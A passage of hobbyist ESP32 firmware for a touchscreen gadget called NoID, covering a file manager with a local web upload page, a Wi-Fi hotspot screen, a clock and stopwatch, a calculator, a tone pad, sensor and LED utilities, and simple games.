      if (att >= 5) {
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        return;
      }
      files = listDir(SD, path.c_str(), 0);
      SD.end();
      touchscreenSPI.end();
      touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
      touchscreen.begin(touchscreenSPI);
      touchscreen.setRotation(SCREEN_ROTATION);
      addedPath = "";
    }
    
    screen.setTextColor(addedPath != "" ? TFT_RED : TFT_WHITE, TFT_BLACK);
    screen.drawString(path + addedPath, 10, 58, 1);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.drawString("File Manager", 10, 30, 4);
    status_bar("Files");
    
    int navi = navigation(false, true);
    if (navi == 0 || navi == 1) {
      screen.setTextColor(TFT_WHITE, TFT_BLACK);
      return;
    }
    if (digitalRead(0) == LOW) path = "/";
    if (navi == 2) {
      bool cng = true;
      int sld = map(satFactor * 10, 0.0, 100.0, 0, 200);
      while (cng) {
        screen.fillScreen(TFT_BLACK);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawString("Picture Color Boost: " + String(satFactor), 10, 60, 2);
        screen.drawRect(10, 80, 220, 20, TFT_WHITE);
        screen.fillRect(10 + sld, 80, 20, 20, TFT_WHITE);
        if (touchscreen.touched()) {
          ffr = 120;
          TS_Point p = touchscreen.getPoint();
          int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
          int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
          if (80 < py && py < 100) sld = px - 10;
        }
        screen.drawLine(20, 125, 220, 125, TFT_WHITE);
        screen.drawLine(20, 235, 220, 235, TFT_WHITE);
        screen.drawCentreString("Start WebServer", 120, 140, 4);
        screen.drawCentreString("Upload files to your NoID", 120, 165, 2);
        screen.drawCentreString("from computer / phone", 120, 180, 2);
        if (button("Start", 70, 205, 100, TFT_WHITE, 2)) {
          int att = 0;
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          SD.end();
          SPI.end();
          touchscreenSPI.end();
          while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
            screen.fillScreen(TFT_BLACK);
            screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
            screen.drawString("attempt: " + String(att), 0, 8, 1);
            screen.pushSprite(0, 0);
            att++;
            delay(1000);
          }
          if (att >= 5) {
            touchscreenSPI.end();
            touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
            touchscreen.begin(touchscreenSPI);
            touchscreen.setRotation(SCREEN_ROTATION);
            screen.setTextColor(TFT_WHITE, TFT_BLACK);
            return;
          }
          clearTerminal();
          tft.fillScreen(TFT_BLACK);
          int wstate = 0;
          if (WiFi.status() == WL_CONNECTED) {terminalPrint("WiFi connected!"); wstate = 1;}
          else if (apRun) {terminalPrint("AP Created!"); wstate = 0;}
          else {
            terminalPrint("No Connection found, suggest create an AP!");
            touchscreenSPI.end();
            touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
            touchscreen.begin(touchscreenSPI);
            touchscreen.setRotation(SCREEN_ROTATION);
            screen.setTextColor(TFT_WHITE, TFT_BLACK);
            return;
          }
          terminalPrint("Creating WebServer...");
          server.on("/", HTTP_GET, [](){
            String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Upload File</title>";
            html += "<style>";
            html += "body { background-color: #000; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }";
            html += "h1 { font-size: 2.5em; margin-bottom: 0.2em; }";
            html += "p { font-size: 1em; margin-top: 0; margin-bottom: 1em; }";
            html += "form { display: flex; flex-direction: column; align-items: center; }";
            html += "input[type='file'] { margin-bottom: 1em; }";
            html += "input[type='submit'] { background-color: #fff; color: #000; border: none; padding: 0.5em 1em; font-size: 1em; cursor: pointer; }";
            html += "input[type='submit']:hover { opacity: 0.8; }";
            html += "</style></head><body>";
            html += "<h1>Upload File</h1>";
            html += "<p>to your NoID device</p>";
            html += "<form action='/upload' method='POST' enctype='multipart/form-data'>";
            html += "<input type='file' name='file'><br>";
            html += "<input type='submit' value='Upload File'>";
            html += "</form>";
            html += "</body></html>";
            server.send(200, "text/html", html);
          });
          server.on("/upload", HTTP_POST, [](){
            server.send(200, "text/plain", "File uploaded successfully!");
          }, [](){
            HTTPUpload& upload = server.upload();
            if (upload.status == UPLOAD_FILE_START) {
              String filename = "/" + upload.filename;
              terminalPrint("Uploading " + filename);
              // Tạo file mới trên thẻ SD
              File file = SD.open(filename, FILE_WRITE);
              if (file) {
                file.close();
              } else {
                terminalPrint("Failed to create file");
              }
            } else if (upload.status == UPLOAD_FILE_WRITE) {
              if (SD.exists(upload.filename)) {
                SD.remove(upload.filename);  // Xóa file cũ trước khi ghi mới
              }
              File file = SD.open("/" + upload.filename, FILE_APPEND);
              if (file) {
                file.write(upload.buf, upload.currentSize);
                file.close();
              } else {
                terminalPrint("Failed to write to file");
              }
            } else if (upload.status == UPLOAD_FILE_END) {
              terminalPrint("Upload End: " + (String)upload.totalSize);
            }
          });
          server.begin();
          terminalPrint("Server started! running at:");
          if (wstate == 0) terminalPrint("192.168.4.1");
          else terminalPrint(WiFi.localIP().toString());
          while (digitalRead(0) == HIGH) {
            delay(1);
            server.handleClient();
          }
          int attempt = 0;
          while (!SD.begin(SD_CS, SPI, 4000000) && attempt < 5) {
            screen.fillScreen(TFT_BLACK);
            screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
            screen.drawString("attempt: " + String(attempt), 0, 8, 1);
            screen.pushSprite(0, 0);
            attempt++;
            delay(1000);
          }
          if (attempt >= 5) {
            touchscreenSPI.end();
            touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
            touchscreen.begin(touchscreenSPI);
            touchscreen.setRotation(SCREEN_ROTATION);
            screen.setTextColor(TFT_WHITE, TFT_BLACK);
            return;
          }

          files = listDir(SD, path.c_str(), 0);
          SD.end();
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          server.stop();
        }
        sld = constrain(sld, 0, 200);
        satFactor = map(sld, 0, 200, 0, 100) / 10.00;
        status_bar("Files");
        int navi = navigation();
        if (navi == 0) cng = false;
        if (navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
        screen.pushSprite(0, 0);
        delay(10);
      }
    }
    
    screen.pushSprite(0, 0);
    if (ffr > 0) ffr--;
    else delay(50);
  }
}

void appHotspot() {
  bool hld = false;
  while (true) {
    screen.fillScreen(TFT_BLACK);
    if (WiFi.getMode() == WIFI_STA) {
      screen.setTextColor(TFT_YELLOW);
      screen.drawCentreString("Warning!!!", 120, 80, 4);
      screen.setTextColor(TFT_WHITE);
      screen.drawCentreString("You need to turn off your Wifi", 120, 110, 2);
      screen.drawCentreString("to continue", 120, 134, 2);
      if (button("Go Back", 50, 160, 40, TFT_RED)) {screen.setTextColor(TFT_WHITE); return;}
      if (button("OK", 150, 160, 40)) WiFi.mode(WIFI_MODE_AP);
    } else if (WiFi.getMode() == WIFI_MODE_AP) {
      if (apRun) {
        screen.drawCentreString("HotSpot Created", 120, 60, 4);
        screen.drawString("Name (SSID):", 10, 100, 2);
        screen.drawString(apSSID, 10, 120, 2);
        screen.drawString("Password:", 10, 140, 2);
        screen.drawString(apPass == "" ? "<None>" : apPass, 10, 160, 2);
        screen.drawString(String(WiFi.softAPgetStationNum()) + " Device Connected", 10, 180, 2);
        if (button("Stop", 10, 240, 60, TFT_RED)) {
          WiFi.softAPdisconnect(false);
          apRun = false;
        }
        screen.setTextColor(TFT_WHITE);
      }
      else {
        WiFi.softAPdisconnect(false);
        bool  canCrt = apSSID != "" && !(apPass.length() > 0 && apPass.length() < 8);
        if (button("Create!", 80, 240, 80, canCrt ? TFT_WHITE : TFT_DARKGREY) && canCrt) {WiFi.softAP(apSSID, apPass); apRun = true;}
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawString("Create Access Point", 10, 40, 4);
        if (apSSID == "") {
          screen.setTextColor(TFT_RED);
          screen.drawString("Name (SSID can't be blank):", 10, 80, 2);
        } else {
          screen.setTextColor(TFT_WHITE);
          screen.drawString("Name (SSID):", 10, 80, 2);
        }
        screen.drawLine(10, 100, 230, 100, TFT_WHITE);
        screen.drawString(apSSID == "" ? "<Click to set>" : apSSID, 10, 104, 2);
        screen.drawLine(10, 140, 230, 140, TFT_WHITE);
        if (apPass.length() > 0 && apPass.length() < 8) {
          screen.setTextColor(TFT_RED);
          screen.drawString("Password too short (under 8)", 10, 160, 2);
        } else {
          screen.setTextColor(TFT_WHITE);
          screen.drawString("Password:", 10, 160, 2);
        }
        screen.drawLine(10, 180, 230, 180, TFT_WHITE);
        screen.drawString(apPass == "" ? "<Click to set>" : apPass, 10, 184, 2);
        screen.drawLine(10, 220, 230, 220, TFT_WHITE);
        screen.setTextColor(TFT_WHITE);
        if (touchscreen.touched() && !hld) {
          hld = true;
          TS_Point p = touchscreen.getPoint();
          int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
          int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
          if (100 < py && py < 140) apSSID = keyboard("Access point name (SSID)", apSSID);
          if (180 < py && py < 220) apPass = keyboard("Access point Password", apPass);
        } if (!touchscreen.touched() && hld) hld = false;
      }
      status_bar("Hotspot");
      int navi = navigation();
      if (navi == 0 || navi == 1) return;
    }
    screen.pushSprite(0,0);
  }
}

void hand(int val, int maxVal, int handLong, int color = TFT_WHITE) {
  float handRad = (map(val, 0, maxVal, 0, 360) - 90) * (PI / 180);
  int hx = cos(handRad) * handLong + 120;
  int hy = sin(handRad) * handLong + 108;
  screen.drawLine(120, 108, hx, hy, color);
}

void csTime() {
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
  screen.drawCircle(120, 108, 80, TFT_WHITE);
  String itt = "";
  if (timeUpdate && WiFi.status() == WL_CONNECTED) itt = gTime(true, true).hm;
  else itt = "--:--:--";
  unsigned long ss = millis() / 1000;
  unsigned long mm = ss / 60;
  unsigned long hh = mm / 60;
  ss = ss % 60;
  mm = mm % 60;
  hh = hh % 24;
  char tmp[10];
  snprintf(tmp, sizeof(tmp), "%02d:%02d:%02d", hh, mm, ss);
  screen.drawCentreString("12", 120, 30, 2);
  screen.drawCentreString("6", 120, 170, 2);
  screen.drawCentreString("3", 194, 100, 2);
  screen.drawCentreString("9", 50, 100, 2);
  if (timeUpdate && WiFi.status() == WL_CONNECTED) {
    unsigned long epo = timeClient.getEpochTime();
    struct tm timeinfo;
    gmtime_r((time_t*)&epo, &timeinfo);
    hand(timeinfo.tm_sec, 60, 78, TFT_RED);
    hand(timeinfo.tm_min, 60, 64, TFT_WHITE);
    hand(timeinfo.tm_hour, 24, 40, TFT_DARKGREY);
  } else {
    hand(ss, 60, 78, TFT_RED);
    hand(mm, 60, 64, TFT_WHITE);
    hand(hh, 24, 40, TFT_DARKGREY);
  }
  screen.fillCircle(120, 108, 2, TFT_WHITE);
  screen.drawCentreString("Internet Time: " + itt, 120, 206, 2.8);
  screen.drawCentreString("Device Time: " + String(tmp), 120, 226, 2.8);
}

String miltostring(int mil) {
  unsigned long ss = mil / 1000;
  unsigned long mm = ss / 60;
  ss = ss % 60;
  mm = mm % 60;
  char tmp[10];
  snprintf(tmp, sizeof(tmp), "%02d:%02d.%02d", mm, ss, mil % 1000 / 10);
  return String(tmp);
}

void csTimer() {
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
  screen.drawCentreString(miltostring(swTime - swStart), 120, 80, 6);
  screen.drawLine(20, 128, 220, 128, TFT_WHITE);
  screen.drawString("Fastest Time: " + miltostring(swFast), 20, 150, 2.4);
  screen.drawString("Longest Time: " + miltostring(swSlow), 20, 168, 2.4);
  if (swRun) {
    if (swPause) swPT = millis() - swTime;
    else swTime = millis();
    if (button("Pause", 30, 220, 40, TFT_WHITE, 2.8)) {if (swPause) swStart += swPT; swPause = !swPause;}
    if (button("Stop", 170, 220, 40, TFT_WHITE, 2.8)) {
      swRun = false;
      swPause = false;
      if (swFast > swTime - swStart || !swF) swFast = swTime - swStart;
      if (swSlow < swTime - swStart) swSlow = swTime - swStart;
      swF = true;
      swTime = 0;
      swStart = 0;
      swPT = 0;
    }
  } else {
    if (button("Start", 100, swF ? 200 : 220, 40, TFT_WHITE, 2.8)) {swRun = true; swStart = millis(); swTime = millis();}
    if (swF) if (button("Clear", 100, 230, 40, TFT_DARKGREY, 2.8)) {
      swF = false;
      swFast = 0;
      swSlow = 0;
      swTime = 0;
      swStart = 0;
      swPT = 0;
    }
  }
}

void appClock() {
  int mode = 0;
  bool tms = false;
  while (true) {
    screen.fillScreen(TFT_BLACK);
    if (mode == 0) csTime();
    if (mode == 1) csTimer();
    status_bar("Clock");
    int navi = navigation(false, true);
    if (navi == 0 || navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
    if (navi == 2) mode = (mode + 1) % 2;
    for (int cx = 0; cx <= 1; cx++) {
      if (cx == mode) screen.fillCircle(cx * 10 + 115, 268, 3, TFT_WHITE);
      else screen.drawCircle(cx * 10 + 115, 268, 3, TFT_WHITE);
    }
    screen.pushSprite(0, 0);
    delay(swRun ? 0 : 100);
  }
}

int miscMenu() {
  const String miscApp[] {
    "Texter",
    "Led RGB",
    "Drawing Board",
    "Calculator",
    "Light Dependent Resistor",
    "Tone Pad",
    "Touch Test",
    "Web Browser"
  };
  bool hld = true;
  int py = 0, sel = -1;
  while (true) {
    screen.fillScreen (TFT_BLACK);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.drawString("Miscellaneous", 10, 40, 4);
    screen.drawLine(10, 70, 180, 70, TFT_WHITE);
    for (int i = 0; i < 8; i++) {
      int y = i * 16 + 80;
      if (y < py && py < y + 16) {
        screen.setTextColor(TFT_BLACK, TFT_WHITE);
        screen.fillRect(10, y, 220, 16, TFT_WHITE);
        sel = i;
      } else screen.setTextColor(TFT_WHITE, TFT_BLACK);
      screen.drawString(String(i + 1) + ". " + miscApp[i], 16, y, 2.8);
    }
    status_bar("More");
    int navi = navigation(false, false);
    if (navi == 0 || navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return -1;}
    if (button("Open", 80, 240, 80) && sel != -1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return sel;}
    screen.pushSprite(0, 0);
    if (touchscreen.touched() && !hld) {
      hld = true;
      TS_Point p = touchscreen.getPoint();
      py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
    } if (!touchscreen.touched() && hld) hld = false;
    delay(50);
  }
}

String trm(char* str) {
  String result = String(str);
  result.trim();
  while (result.endsWith("0")) {
    result.remove(result.length() - 1);
  }
  if (result.endsWith(".")) {
    result.remove(result.length() - 1);
  }
  return result;
}

const String noteName[] = {
"C", "C#", "D", "Eb", "E", "F", "F#", "G", "G#", "A", "Bb", "B"
};

const note_t notes[] = {
NOTE_C, NOTE_Cs, NOTE_D, NOTE_Eb, NOTE_E, NOTE_F, NOTE_Fs, NOTE_G, NOTE_Gs, NOTE_A, NOTE_Bb, NOTE_B
};

void tonePad() {
  ledcSetup(6, 5000, 8);
  ledcAttachPin(26, 6);

  int currentOctave = 4; 

  const int GRID_COLS = 4;
  const int GRID_ROWS = 6; 
  const int CELL_SIZE = 50;
  int gridWidth = GRID_COLS * CELL_SIZE; 
  int gridHeight = GRID_ROWS * CELL_SIZE;

  int gridX = (240 - gridWidth) / 2;
  int gridY = 20; 

  bool update = true, toning = false;
  while (digitalRead(0) == HIGH) {
    if (button("Oct -", 50, 0, 20, TFT_WHITE, 2.5)) {
      if (currentOctave > 1) currentOctave--;
      update = true;
    }
    if (button("Oct +", 170, 0, 20, TFT_WHITE, 2.5)) {
      if (currentOctave < 7) currentOctave++;
      update = true;
    }
    if (update) {
      update = false;
      screen.fillScreen(TFT_BLACK);
    
      button("Oct -", 50, 0, 20, TFT_WHITE, 2.5);
      button("Oct +", 170, 0, 20, TFT_WHITE, 2.5);
      screen.setTextColor(TFT_WHITE, TFT_BLACK);
      screen.drawCentreString("Octave: " + String(currentOctave), 120, 0, 2.5);

      for (int r = 0; r < GRID_ROWS; r++) {
        int logicalRow = GRID_ROWS - 1 - r; 
        int octave = (logicalRow < 3) ? currentOctave : currentOctave + 1;
        for (int c = 0; c < GRID_COLS; c++) {
          int noteIndex = (logicalRow % 3) * GRID_COLS + c;
          int cellX = gridX + c * CELL_SIZE;
          int cellY = gridY + r * CELL_SIZE;
          screen.drawRect(cellX, cellY, CELL_SIZE, CELL_SIZE, TFT_WHITE);
          String label = noteName[noteIndex] + String(octave);
          screen.drawCentreString(label, cellX + CELL_SIZE/2, cellY + CELL_SIZE/2 - 8, 2.5);
        }
      }

      screen.pushSprite(0, 0);
    }

    if (touchscreen.touched()) {
      TS_Point p = touchscreen.getPoint();
      int tx = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      int ty = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      if (tx >= gridX && tx < gridX + gridWidth &&
          ty >= gridY && ty < gridY + gridHeight) {
        int col = (tx - gridX) / CELL_SIZE;
        int row = (ty - gridY) / CELL_SIZE;
        int logicalRow = GRID_ROWS - 1 - row;
        int octave = (logicalRow < 3) ? currentOctave : currentOctave + 1;
        int noteIndex = (logicalRow % 3) * GRID_COLS + col;
        if (!toning) {ledcWriteNote(6, notes[noteIndex], octave); toning = true;}
      }
    } else {ledcWrite(6, 0); toning = false;}
  }
}

void miscCalc() {
  const char* normButtom = "789*456/123-.0=+";
  const String normRef = "0123456789.", opRef = "+-*/";
  String num1 = "0", num2 = "0", opr = "+";
  bool hld = true, ft = true, dec = false, tn2 = false;
  int px = 0, py = 0;
  while (true) {
    screen.fillScreen(TFT_BLACK);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int row = 0; row < 4; row++) {
      for (int col = 0; col < 4; col++) {
        screen.drawRect(col * 60, 80 + row * 60, 60, 60, TFT_WHITE);
        screen.drawCentreString(String(normButtom[row * 4 + col]), col * 60 + 30, 100 + row * 60, 4);
        if (col * 60 < px && px < col * 60 + 60 && row * 60 + 80 < py && py < row * 60 + 140) {
          char c = normButtom[row * 4 + col];
          String tmp = "";
          if (tn2) tmp = num2;
          else tmp = num1;
          if (normRef.indexOf(c) >= 0 && tmp.length() < 9) {
            if (ft && String(c) != ".") tmp = String(c);
            else if (String(c) == "." && !dec) {tmp += String(c); dec = true;}
            else if (String(c) != ".") tmp += String(c);
            ft = false;
            if (tn2) num2 = tmp;
            else num1 = tmp;
          } else {
            if (opRef.indexOf(c) >= 0) {opr = String(c); tn2 = true; ft = true; dec = false;}
            else if (tn2) {
              float a = num1.toFloat();
              float b = num2.toFloat();
              float res = 0;
              if (opr == "+") res = a + b;
              if (opr == "-") res = a - b;
              if (opr == "*") res = a * b;
              if (opr == "/") {
                if (b == 0) res = 0;
                else res = a / b;
              }
              char buffer[20];
              dtostrf(res, 1, 7, buffer);
              num1 = trm(buffer).substring(0, 8);
              num2 = "0";
              tn2 = false;
              ft = true;
              dec = !(num1.indexOf(".") == -1);
            }
          }
          px = 0;
          py = 0;
        }
      }
    }
    if (touchscreen.touched() && !hld) {
      hld = true;
      TS_Point p = touchscreen.getPoint();
      px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 0, SCREEN_WIDTH);
      py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 0, SCREEN_HEIGHT);
    } if (!touchscreen.touched() && hld) hld = false;
    if (tn2) {
      screen.drawString(num2, 240 - screen.textWidth(num2, 6) - 2, 10, 6);
      screen.drawString(num1 + opr, 240 - screen.textWidth(num1 + opr, 1) - 2, 0, 1);
    } else screen.drawString(num1, 240 - screen.textWidth(num1, 6) - 2, 10, 6);
    if (button("Exit", 10, 54, 40)) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
    if (button("Clear", 190, 54, 40, TFT_DARKGREY)) {num1 = "0"; ft = true; dec = false; tn2 = false;}
    screen.pushSprite(0, 0);
    delay(10);
  }
}

void miscLDR() {
  screen.fillScreen(TFT_BLACK);
  int cx = 0;
  while (true) {
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.fillRect(0, 0, 240, 20, TFT_BLACK);
    screen.fillRect(0, 280, 240, 40, TFT_BLACK);
    int nav = navigation();
    if (nav == 0 || nav == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); break;}
    status_bar("LDR Read");
    if (digitalRead(0) == LOW) screen.fillRect(0, 40, 240, 180, TFT_BLACK);
    screen.drawLine(0, 40, 240, 40, TFT_WHITE);
    screen.drawLine(0, 220, 240, 220, TFT_WHITE);
    int ldr = analogRead(34);
    screen.fillRect(0, 221, 241, 20, TFT_BLACK);
    screen.drawString("LDR Value:" + String(ldr), 10, 230, 1);
    int cy = map(ldr, 0, 4095, 218, 41);
    screen.drawPixel(cx, cy, TFT_CYAN);
    screen.pushSprite(0, 0);
    if (cx < 240) cx++;
    else cx = 0;
    //delay(100);
  }
}

void miscRGB() {
  const uint16_t col[] = {TFT_RED, TFT_GREEN, TFT_BLUE};
  int px = 0, py = 0;
  while (true) {
    screen.fillScreen(TFT_BLACK);
    if (touchscreen.touched()) {
      TS_Point p = touchscreen.getPoint();
      px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 0, SCREEN_WIDTH);
      py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 0, SCREEN_HEIGHT);
      for (int i = 0; i < 3; i++)
      if (40 + 60 * i < px && px < 80 + 60 * i && 50 < py && py < 210) leC[i] = constrain(map(py, 60, 200, 255, 0), 0, 255);
      ledColor(leC[0], leC[1], leC[2]);
    }
    for (int i = 0; i < 3; i++) {
      int colVal = map(255 - leC[i], 0, 255, 0, 140);
      screen.drawRect(40 + 60 * i, 60, 40, 140, col[i]);
      screen.fillRect(40 + 60 * i, 60 + colVal, 40, 140 - colVal, col[i]);
      screen.setTextColor(col[i], TFT_BLACK);
      screen.drawCentreString(String(leC[i]), 60 + 60 * i, 210, 2);
      //if (40 + 60 * i < px && px < 80 + 60 * i && 60 < py && py < 200) leC[i] = constrain(map(py, 60, 200, 0, 255), 0, 255);
    }
    if (button("Turn off", 100, 238, 40, TFT_DARKGREY)) for (int i = 0; i < 3; i++) leC[i] = 0;
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    status_bar("Led RGB");
    int navi = navigation();
    if (navi == 0 || navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
    screen.pushSprite(0, 0);
    //delay(100);
  }
}

void miscTouch() {
  bool inUse = true;
  int px = 0, py = 0, pz = 0,
  rx = 0, ry = 0, rz = 0;
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
  while (inUse) {
    screen.fillScreen(TFT_BLACK);
    screen.drawString("X:" + String(px) + " | Y: " + String(py) + " | Z:" + String(pz), 2, 2, 1);
    screen.drawString("Raw X:" + String(rx), 2, 12, 1);
    screen.drawString("Raw Y:" + String(ry), 2, 22, 1);
    screen.drawString("Raw Z:" + String(rz), 2, 32, 1);
    if (touchscreen.touched()) {
      TS_Point p = touchscreen.getPoint();
      px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      pz = p.z;
      rx = p.x;
      ry = p.y;
      rz = p.z;
    }
    screen.drawLine(px, 0, px, 320, TFT_BLUE);
    screen.drawLine(0, py, 240, py, TFT_RED);
    screen.drawCircle(px, py, 5, TFT_WHITE);
    screen.pushSprite(0, 0);
    if (digitalRead(0) == LOW) inUse = false;
  }
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
}

int gameMenu() {
  const String gameName[] {
    "Flapy Bird",
    "Dino Jump",
    "2048",
    "Snake",
    "Memory Game",
    "idk man"
  };
  bool hld = true;
  int py = 0, sel = -1;
  while (true) {
    screen.fillScreen (TFT_BLACK);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.drawString("Choose Game:", 10, 40, 4);
    screen.drawLine(10, 70, 180, 70, TFT_WHITE);
    for (int i = 0; i < 5; i++) {
      int y = i * 16 + 100;
      if (y < py && py < y + 16) {
        screen.setTextColor(TFT_BLACK, TFT_WHITE);
        screen.fillRect(10, y, 220, 16, TFT_WHITE);
        sel = i;
      } else screen.setTextColor(TFT_WHITE, TFT_BLACK);
      screen.drawString(String(i + 1) + ". " + gameName[i], 16, y, 2.8);
    }
    status_bar("Games");
    int navi = navigation(false, false);
    if (navi == 0 || navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return -1;}
    if (button("Play!", 80, 240, 80) && sel != -1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return sel;}
    screen.pushSprite(0, 0);
    if (touchscreen.touched() && !hld) {
      hld = true;
      TS_Point p = touchscreen.getPoint();
      py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
    } if (!touchscreen.touched() && hld) hld = false;
    delay(50);
  }
}

int randRange(int min, int max) {return min + esp_random() % (max - min + 1);}

void gameFlappy() {
  int hi = 0, sc = 0, bry = 160,
  t1x = 120, t1y = randRange(60, 210), t2x = 240, t2y = randRange(60, 220);
  bool pl = false, f = false;
  while (true) {
    screen.fillScreen(TFT_CYAN);
    screen.fillRect(0, 250, 240, 70, TFT_GREEN);
    screen.setTextColor(TFT_BLACK, TFT_CYAN, true);
    screen.drawCentreString("Flappy Bird", 120, 80, 4);
    if (f) screen.drawCentreString("Game Over", 120, 100, 2);
    screen.drawString("Higest: " + String(hi), 2, 2, 1);
    screen.fillRect(t1x, 0, 20, t1y - 30, TFT_DARKGREEN);
    screen.fillRect(t1x, t1y + 30, 20, 250 - t1y, TFT_DARKGREEN);
    screen.fillRect(t2x, 0, 20, t2y - 30, TFT_DARKGREEN);
    screen.fillRect(t2x, t2y + 30, 20, 250 - t2y, TFT_DARKGREEN);
    if (button("Play!", 100, 200, 40, TFT_WHITE, 2.9)) pl = true;
    if (button("Exit", 100, 230, 40, TFT_WHITE, 2.9)) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
    screen.pushSprite(0, 0);
    if (t1x > -20) t1x--;
    else {t1x = 240; t1y = randRange(60, 210);}
    if (t2x > -20) t2x--;
    else {t2x = 240; t2y = randRange(60, 210);}
    if (pl)
    sc = 0, t1x = 240, t1y = randRange(60, 210), t2x = 360, t2y = randRange(60, 220);
    float brv = 0;
      while (pl) {
        screen.fillScreen(TFT_CYAN);
        screen.fillRect(0, 250, 240, 70, TFT_GREEN);
        screen.setTextColor(TFT_BLACK, TFT_CYAN, true);
        screen.drawCentreString(String(sc), 120, 80, 4);
        screen.fillRect(t1x, 0, 20, t1y - 30, TFT_DARKGREEN);
        screen.fillRect(t1x, t1y + 30, 20, 250 - t1y, TFT_DARKGREEN);
        screen.fillRect(t2x, 0, 20, t2y - 30, TFT_DARKGREEN);
        screen.fillRect(t2x, t2y + 30, 20, 250 - t2y, TFT_DARKGREEN);
        screen.fillRect(110, bry, 20, 20, TFT_YELLOW);
        screen.pushSprite(0, 0);
        if (touchscreen.touched()) brv = -1.2;
        if (bry + brv > 0 && bry + brv < 250) bry += brv;
        else brv = 0;
        bry = constrain(bry + brv, 1, 249);
        brv = constrain(brv + 0.1, -8, 10);
        if (!(t1y - 50 < bry && bry < t1y + 40) && 110 < t1x && t1x < 130) {pl = false; f = true;}
        if (!(t2y - 50 < bry && bry < t2y + 40) && 110 < t2x && t2x < 130) {pl = false; f = true;}
        if (t1x > -20) t1x--;
        else {t1x = 240; t1y = randRange(60, 210); sc++;}
        if (t2x > -20) t2x--;
        else {t2x = 240; t2y = randRange(60, 210); sc++;}
        if (sc > hi) hi = sc;
        delay(1);
      }
    delay(10);
  }
}

void gameMem() {
  int hi = 0, size = 2;
  while (true) {
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.fillScreen(TFT_BLACK);
    status_bar("Playing");
    screen.drawCentreString("Memory Game", 120, 80, 4);
    screen.drawCentreString("Remember the square!", 120, 110, 2.4);
    screen.drawString("Grid Size:", 50, 160, 2.4);
    if (button("2x2",  50, 180, 20, size == 2 ? TFT_DARKGREY : TFT_WHITE, 2.9)) size = 2;
    if (button("3x3", 110, 180, 20, size == 3 ? TFT_DARKGREY : TFT_WHITE, 2.9)) size = 3;
    if (button("4x4", 170, 180, 20, size == 4 ? TFT_DARKGREY : TFT_WHITE, 2.9)) size = 4;
    
    if (button("Start", 180, 260, 20, TFT_WHITE, 2.9)) {
      bool playing = true;
      int grd = 220 / size;
      int level = 1;
      int sequenceX[100] = {0};
      int sequenceY[100] = {0};
      
      randomSeed(analogRead(0));
      
      while (playing) {
        sequenceX[level - 1] = random(0, size);
        sequenceY[level - 1] = random(0, size);
        
        screen.fillScreen(TFT_BLACK);
        status_bar("Level " + String(level));
        screen.drawCentreString("Level " + String(level), 120, 80, 4);
